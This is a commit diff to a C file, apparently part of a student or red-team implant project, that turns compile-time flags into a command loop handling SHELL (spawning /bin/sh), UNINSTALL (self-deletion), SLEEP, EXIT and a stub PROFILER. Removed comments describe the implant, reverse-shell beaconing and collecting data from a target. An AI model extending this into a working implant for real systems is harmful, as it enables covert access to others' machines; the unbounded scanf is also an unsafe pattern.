implement if statements to handle commands
testing

+++ src/commands.c
@@ -2,55 +2,55 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <sys/wait.h>
+#include <string.h>
 
 
-int main(int argc, char * argv[]) {
+int main(int argc, char *argv[])
+{
+    while (1)
+    {
+        printf("Enter your command: ");
+        char cmd[256];
+        scanf("%s", cmd);
 
-
-#ifdef UNINSTALL
-    remove(argv[0]);
-#endif
-
-
-
-#ifdef EXIT
-//"EXIT": When this command is received the implant will kill itself, but will not uninstall
-   kill(getpid(), SIGKILL);
-#endif
-
-
-
-#ifdef SHELL
-    int proc = fork();
-    if(proc >= 1){//parent
-        wait(NULL);//wait until child terminates
+        if (strcmp(cmd, "SHELL") == 0)
+        {
+            /* code */
+            int proc = fork();
+            if (proc >= 1)
+            {               //parent
+                wait(NULL); //wait until child terminates
+            }
+            else if (proc == 0)
+            { //child process
+                execl("/bin/sh", "sh", NULL);
+            }
+        }
+        else if (strcmp(cmd, "UNINSTALL") == 0)
+        {
+            remove(argv[0]);
+        }
+        else if (strcmp(cmd, "SLEEP") == 0)
+        {
+            int sleeptime = 0;
+            // printf("How long? ");
+            scanf("%d", &sleeptime);
+            sleep(sleeptime);
+        }
+        else if (strcmp(cmd, "PROFILER") == 0)
+        {
+            // TODO: Implement the profiler
+            printf("Implement the profiler lol\n");
+        }
+        else if (strcmp(cmd, "EXIT") == 0)
+        {
+            kill(getpid(), SIGKILL);
+        }
+        else {
+            printf("Unrecognized command.\n");
+        }
     }
-    else if (proc == 0){//child process
-        execl ("/bin/sh", "sh", NULL);
-    }
-#endif
 
-
-
-#ifdef SLEEP
-/*
- *"SLEEP": The implant initially sleep N seconds, set at compile time. If a reverse shell, the client will update its internal default sleep state to N seconds and end the connection. It will then operate on that new sleep schedule before attempting its next connection. 
-*/
-    int sleepTime = atoi(argv[1]);
-    sleep(sleepTime);
-#endif
-
-
-
-#ifdef PROFILING
-//"PROFILER": If this command is received the implant will run the profiler function and send back as much data as collected on the target
-//valhelper
-#endif
-
-
-
-
-return 0;
-
+    return 0;
 }
-
